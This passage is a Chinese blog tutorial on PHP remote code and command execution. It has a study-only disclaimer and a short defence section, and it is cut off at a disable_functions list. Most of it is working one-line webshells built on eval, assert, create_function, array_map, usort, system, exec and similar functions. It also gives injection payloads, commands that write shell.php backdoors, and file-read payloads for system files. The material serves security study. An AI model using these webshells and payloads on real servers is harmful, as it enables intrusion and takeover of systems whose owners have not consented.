        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE的学习</title>
      <link href="/2022/05/08/rce_study/"/>
      <url>/2022/05/08/rce_study/</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;声明：本篇文章仅用于学习笔记记录，不得用于其他违规用途。&#x3D;&#x3D;<br>RCE为两种漏洞的缩写，分别为Remote Command&#x2F;Code Execute，远程命令&#x2F;代码执行。<br>一般出现这种漏洞，是因为应用系统从设计上需要个用户提供指定的远程命令操作的接口。<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交意想不到的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h1 id="一、代码执行"><a href="#一、代码执行" class="headerlink" title="一、代码执行"></a>一、代码执行</h1><p>因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。<br>##1、危险函数<br>###（1）eval（）<br>eval()函数把字符串安装PHP代码来计算，如常见的一句话后门程序：<br><?php eval($_POST['cmd']);?><br>###（2）assert（）<br>与eval()类似，字符串被assert（）当做PHP代码来执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通调⽤</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">assert</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//?cmd=phpinfo()</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8e5c111d27924d129c219a056cff66cc-20230403140647538.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//assert函数⽀持动态调⽤</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"> <span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//?a=phpinfo()</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b1a00508bbac4a8bab1607cdc07b1383.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;php官方在php7中更改了assert（)函数，在php7.0.29之后的版本不支持动态调用。&#x3D;&#x3D;</p><h3 id="（3）create-function（）"><a href="#（3）create-function（）" class="headerlink" title="（3）create_function（）"></a>（3）create_function（）</h3><p>create_function（）主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function（）执行任意命令。<br>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//语法：</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span> ( <span class="variable">$args</span>, <span class="variable">$code</span> )</span><br><span class="line"><span class="comment">//参数：</span></span><br><span class="line"> <span class="variable">$args</span>:它是⼀个字符串类型的函数参数。变量部分</span><br><span class="line"> <span class="variable">$code</span>:它是字符串类型的函数代码。⽅法代码部分</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line">类似于：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 源代码：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 注⼊后代码：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*;//此处为注⼊代码。</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b9c8fe82e3be4ab68c60be760c2bb763.png" alt="在这里插入图片描述"><br>简单代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure><h3 id="（4）array-map（）"><a href="#（4）array-map（）" class="headerlink" title="（4）array_map（）"></a>（4）array_map（）</h3><p>array_map（）函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组，回调函数接收的参数数目应该和传递给array_map()函数的数组数目一致。<br>语法：<br>array_map(myfunction,array1,array2,array3…)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//print_r($new_array);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2a93f5d355264f2aa9f24dc246caaf23.png" alt="在这里插入图片描述"><br>###（5）call_user_func()&#x2F;call_user_func_array()<br>-call_user_func- 把第一个参数作为回调函数调用，其余参数是回调函数的参数。<br>-call_user_func_array - 调用回调函数，并把一个数组参数作为回调函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$test1</span>, <span class="variable">$test2</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$test1</span> . <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);<span class="comment">//输出结果为ab</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;test&#x27;</span>, [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]);<span class="comment">//输出结果为cd</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=print &quot;admin&quot;;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ad155b758d4a4c2bafa8d5ea5a0f4008.png" alt="在这里插入图片描述"><br>###（6）array_filter()<br>依次将array数组中的每个值传递到callback函数，如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中，数组的键名保留不变。<br>array array_filter($array, $callback_function, $flag)</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 参数：</span><br><span class="line"> array 必需。规定要过滤的数组。</span><br><span class="line"> callback 可选。规定要⽤的回调函数。</span><br><span class="line"> flag 可选。决定 callback 接收的参数形式</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/6534707ab10047bf9f495f205ddcee2d.png" alt="在这里插入图片描述"><br>###（7）usort（）<br>usort（）通过用户自定义的比较函数对数组进行排序</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usort(array,myfunction);</span><br><span class="line"># 参数</span><br><span class="line">array 必需。规定要排序的数组。第⼀个参数必须是数组</span><br><span class="line">myfunction 可选。⼀个定义了可调⽤⽐较函数的字符串。第⼆个参数是函数名称</span><br></pre></td></tr></table></figure><p>通俗点说就是一个稍微复杂点的数组，如果用php自带的函数不是很方便，所以用户可以自己定义一个函数，然后使用usort函数来进行回调。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_sort</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="variable">$b</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$a</span>&lt;<span class="variable">$b</span>)?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$list</span> = <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$list</span>,<span class="string">&#x27;my_sort&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>usort函数执行的时候，会一次把$a中的两个值，传递给名字为my_sort函数中，所以会看到my_sort有两个形参，然后php会判断my_sort函数的返回值。<br>如果为0，则位置不变，如果为-1，则$a位置和$b不变，如果为1，则$a位置和$b互换。<br>举例：<br>变长参数是PHP5.6新引入的特性：<br>…运算符，就是三个点，该运算符可以将数组或者可遍历的对象展开变为参数，不过必须是索引数组。<br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$list</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$list</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;========\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(...<span class="variable">$list</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">返回结果：</span><br><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line"> [<span class="number">0</span>]=&gt;</span><br><span class="line"> <span class="type">int</span>(<span class="number">1</span>)</span><br><span class="line"> [<span class="number">1</span>]=&gt;</span><br><span class="line"> <span class="type">int</span>(<span class="number">2</span>)</span><br><span class="line"> [<span class="number">2</span>]=&gt;</span><br><span class="line"> <span class="type">int</span>(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line">========</span><br><span class="line"><span class="type">int</span>(<span class="number">1</span>)</span><br><span class="line"><span class="type">int</span>(<span class="number">2</span>)</span><br><span class="line"><span class="type">int</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>编写一句话（PHP环境&gt;&#x3D;5.6）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么$_GET变量中的值，应该是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;$a=0&#x27;</span>,<span class="string">&#x27;eval($_POST[&quot;x&quot;])&#x27;</span>],<span class="string">&#x27;assert&#x27;</span>];</span><br></pre></td></tr></table></figure><p>$_GET[0] 是usort的第⼀个参数<br>$_GET[1] 是usort的回调函数名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">也就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>([<span class="string">&#x27;$a=0&#x27;</span>,<span class="string">&#x27;eval($_POST[&quot;x&quot;])&#x27;</span>],<span class="string">&#x27;assert&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终传参payload：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="number">1</span>[]=<span class="number">1</span><span class="number">-1</span>&amp;<span class="number">1</span>[]=eval($_POST[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">POST: x=phpinfo();</span><br></pre></td></tr></table></figure><p>大概过程就是，GET变量被展开成两个参数[‘0’, ‘eval($_POST[‘x’]’] 和 assert ，传⼊usort函数。usort函数的第⼆个参数是⼀个回调函数 assert ，其调⽤了第⼀个参数中的eval($_POST[‘x’] 。传参为 phpinfo(); 给webshell即可。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/99d22ca86d3d4b78b25f7ef2a4a26de0.png" alt="在这里插入图片描述"><br>编写一句话（php环境&lt;&#x3D;5.6)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x])</span><br><span class="line">POST: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/550d62b69ea4495092549a23eebeef2a.png" alt="在这里插入图片描述"><br>###（8）文件操作函数</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents() 函数把⼀个字符串写⼊⽂件中。</span><br><span class="line">fputs() 函数写⼊⽂件。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问直接写⼊：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&#x27;&lt;?php eval($_POST[111]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test1.php&#x27;</span>,<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[111])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数写⼊：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># ⽂件读取：</span></span><br><span class="line">?cmd=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;c:\windows\win.ini&quot;</span>));</span><br><span class="line"><span class="comment"># 获取绝对路径：</span></span><br><span class="line">?cmd=<span class="keyword">print</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment"># file_put_contents()函数写⼊⼀句话⽊⻢：(需知道绝对路径)</span></span><br><span class="line">?cmd=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;x&quot;]);?</span></span><br><span class="line"><span class="string">&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># fputs()函数写⼊⼀句话⽊⻢：</span></span><br><span class="line">?cmd=<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;info.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（9）动态函数"><a href="#（9）动态函数" class="headerlink" title="（9）动态函数"></a>（9）动态函数</h3><p>PHP函数直接由字符串拼接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="comment">//?a=system&amp;b=whoami</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/66ea9067378747528e1e4748ab3cf69a.png" alt="在这里插入图片描述"><br>##2、代码执行的攻击方法<br>代码执行漏洞是一种很严重的漏洞，因为能注入执行脚本代码，所以利用的手段很多，常见的执行命令，获取敏感信息，写入web后门等。<br>##3、代码执行的防御方法</p><ol><li>使⽤ json 保存数组，当读取时就不需要使⽤ eval 了 ；</li><li>对于必须使⽤ eval 的地⽅，⼀定严格处理⽤户数据（⽩名单、⿊名单）；</li><li>字符串使⽤单引号包括可控代码，插⼊前使⽤ addslashes 转义（addslashes、魔数引号、 htmlspecialchars、htmlentities、mysql_real_escape_string） ；</li></ol><h1 id="二、命令执行"><a href="#二、命令执行" class="headerlink" title="二、命令执行"></a>二、命令执行</h1><h2 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h2><h3 id="（1）system-args-有回显"><a href="#（1）system-args-有回显" class="headerlink" title="（1）system(args)有回显"></a>（1）system(args)有回显</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（2）passthru（args）有回显"><a href="#（2）passthru（args）有回显" class="headerlink" title="（2）passthru（args）有回显"></a>（2）passthru（args）有回显</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（3）exec（args）回显最后一行"><a href="#（3）exec（args）回显最后一行" class="headerlink" title="（3）exec（args）回显最后一行"></a>（3）exec（args）回显最后一行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">print</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（4）shell-exec（args）"><a href="#（4）shell-exec（args）" class="headerlink" title="（4）shell_exec（args）"></a>（4）shell_exec（args）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">print</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（5）popen（）返回的是文件指针而非命令执行结果"><a href="#（5）popen（）返回的是文件指针而非命令执行结果" class="headerlink" title="（5）popen（）返回的是文件指针而非命令执行结果"></a>（5）popen（）返回的是文件指针而非命令执行结果</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;&gt; 1.txt&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果将输出在当前⽬录下的1.txt⽂件内</span></span><br></pre></td></tr></table></figure><h2 id="2、bt禁用函数"><a href="#2、bt禁用函数" class="headerlink" title="2、bt禁用函数"></a>2、bt禁用函数</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = 